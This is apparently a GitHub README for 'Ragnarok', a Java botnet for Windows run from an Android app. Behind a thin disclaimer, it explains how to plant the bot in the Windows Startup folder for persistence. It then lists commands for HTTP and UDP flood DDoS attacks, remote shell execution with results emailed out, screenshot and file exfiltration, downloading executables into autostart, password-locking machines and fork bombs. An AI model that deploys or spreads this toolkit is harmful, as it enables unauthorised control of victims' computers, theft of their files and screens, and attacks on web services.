# Ragnarok
Java Botnet for Windows (Not released yet)

---EULA---

Ragnarok is a botnet with both fun purpose harmless commands and real ddos capability which can be used to measure ddos resistance on web services by launching attacks from multiple devices.
Ddosing a website without getting permission from its owner is illegal in most of countries.
Installing botnet to school, internet cafe or workplace computers without getting permission is illegal in most of countries.
Using Ragnarok's fun purpose commands on computers that belongs to other people or companies for malicious intent like disabling/locking computer, stealing personal files, executing harmful terminal commands, installing another software/files, watching their screen or causing their browser to visit a harmful website is considered illegal in most of countries.

I dont take any responsibility if you cause any harm with this program so use it at your own risk!

---How To Use---

Step 1: Download Ragnarok app to your Android device from googleplay.

Step 2: Download RagnarokBot.jar from this Github page

Step 3: Copy RagnarokBot.jar to "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" folder on any windows pc you want to remotely control then make sure you rename it to anything else than RagnarokBot because default name forbidden for creating bot groups. (copying it to startup folder makes windows start it everytime pc turns on)

Step 4: Install Java 8 update 361 (lastest of Java 8) to that pc. Do not install Java versions that came after than Java 8 because they cause massive bugs. You can just download JavaSetup8u361.exe from this Github and use that to install perfect Java version for Ragnarok.

Step 5: Start bot by double clicking that renamed jar file and then open Ragnarok app from your android device and then type name of your jar file to bot group section and press connect.
When you send a command to a bot group then all of bots around the world which has that bot group name on itself will execute that commands so make sure you note what name you used when renaming your jar file.

Step 6: After app says "Connected" you can pick any command from command list then send it to connected bots around the world.
Keep reading to learn about how to modify command arguments.

---How To Send Commands---

Some commands can be sent without any arguments meanwhile some of them require arguments which needs to be seperated with '#' symbol. Arguments bar will be filled with argument template of related command when you select a command so all you need to do is replacing these arguments before sending selected command. Leave arguments bar empty if it comes as empty when you select a command because that means selected command doesnt require any arguments. You can find example command arguments for all available commands below.

---Command List---

HttpFlood;
Arguments: Url, Threads
Effect: Launches specified number of ddos attacks to given url by using http flood method.
Example Command Argument: https://example.com/#5000

UdpFlood;
Arguments: Ip, Threads
Effect: Launches specified number of ddos attacks to given ip/domain by using udp flood method.
Example Command Argument 1: 93.184.216.34#100
Example Command Argument 2: example.com#100

Clusterstorm;
Arguments: Url, Threads
Effect: Launches specified number of ddos attacks to given url by using powerful custom method.
Example Command Argument: https://example.com/#5000

I-Mod;
Arguments: Url, Threads, DelayMillisec, PayloadCount
Effect: Launches specified number of ddos attacks to given url by using powerful custom method.
Example Command Argument: https://example.com/#5000#250#30

Pulsar;
Arguments: Url, Threads, Delay
Effect: Launches specified number of ddos attacks to given url by using powerful custom method.
Example Command Argument: https://example.com/#5000#250

Lock;
Arguments: password
Effect: prevents target computers from being used until users enter correct password that you set.
Example Command Argument: 123456789

Browse;
Arguments: Url
Effect: Uses default browser to open specified url.
Example Command Argument: https://example.com/

Terminal;
Arguments: CMD
Effect: Executes given terminal command on windows terminal
Example Command Argument: ipconfig

Terminal&Output;
Arguments: CMD, ToEmail
Effect: Executes given terminal command on windows terminal then emails results to given adress.
Example Command Argument: ipconfig#yourmail@gmail.com

Message;
Arguments: Text
Effect: Shows given text on screen.
Example Command Argument: something is in your pc

ChangeDesktopBG;
Arguments: JpgUrl, IntervalMS
Effect: Changes desktop background image with given image from a url in a loop.
Example Command Argument: https://example.com/image.jpg#1000

Screenshot;
Arguments: Count, IntervalMS, ToEmail
Effect: Takes screenshots according to given count and interval then emails them to given adress.
Example Command Argument: 5#10000#yourmail@gmail.com

EmailFile;
Arguments: FilePath, ToEmail, Message
Effect: Picks file according to given path then emails it to given adress with specified message. Uploads file to yandex drive if file is too big to email directly.
Example Command Argument: C:\Users\Admin\Desktop\Document.pdf#yourmail@gmail.com#yay

DownloadFile;
Arguments: Url, FilePath
Effect: Downloads a file from url then puts it to specified location. Downloaded file will be replaced if a file already exists with same name and extension on specified location.
Example Command Argument 1: https://example.com/image.jpg#C:\Users\Admin\Desktop\image.jpg
Example Command Argument 2: https://example.com/someprogram.exe#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\someprogram.exe

StickyMouse;
Arguments: None
Effect: Mouse cursor wont be able to move far away from its current point.

CrazyMouse;
Arguments: None
Effect: Mouse cursor moves around randomly.

CrazyDrivers;
Arguments: None
Effect: CD/DVD roms will keep opening and closing itself.

CrazyKeyboard;
Arguments: None
Effect: Keyboard will type random stuff constantly. 

BSOD;
Arguments: None
Effect: Creates a fake BSOD effect which can be closed by pressing 'E' key.

ForkBomb;
Arguments: None
Effect: Overloads CPU until pc freezes.

ForkBombUltimate;
Arguments: None
Effect: Same with ForkBomb command but uses different method.

---Things To Remember---

You can have multiple bots with different names on same pc.
There is a chance that somebody else using same bot name with your bot. That will cause his/her commands to be executed by yours too meanwhile your commands will be executed by their botnet too so better prefer some unique names for your jar file (botnet) to have some privacy.
You can copy your bot to any other folder than startup folder and launch it yourself when you need it if you dont want it to auto start when pc turns on.
